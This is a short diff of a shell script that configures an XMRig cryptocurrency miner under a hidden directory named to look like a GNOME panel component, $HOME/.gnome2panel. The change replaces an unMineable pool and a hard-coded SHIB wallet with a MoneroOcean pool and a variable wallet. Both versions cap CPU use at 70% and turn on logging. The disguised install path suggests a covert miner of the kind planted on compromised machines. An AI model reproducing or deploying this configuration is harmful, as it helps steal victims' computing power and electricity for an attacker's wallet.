@@ -210,10 +210,9 @@ fi
 if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
-
-sed -i 's/"url": *"[^"]*",/"url": "rx.unmineable.com:3333",/'  $HOME/.gnome2panel/config.json
-sed -i 's/"user": *"[^"]*",/"user": "SHIB:0x0AD5FbbF5C59b0F4038D2DDd1e19929E4602cC8b.'$PASS'",/'  $HOME/.gnome2panel/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "x",/'  $HOME/.gnome2panel/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/'  $HOME/.gnome2panel/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/'  $HOME/.gnome2panel/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "zafilinux-'$PASS'",/'  $HOME/.gnome2panel/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 70,/'  $HOME/.gnome2panel/config.json
 sed -i 's#"log-file": *null,#"log-file": "' $HOME/.gnome2panel/xmrig.log'",#'  $HOME/.gnome2panel/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/'  $HOME/.gnome2panel/config.json
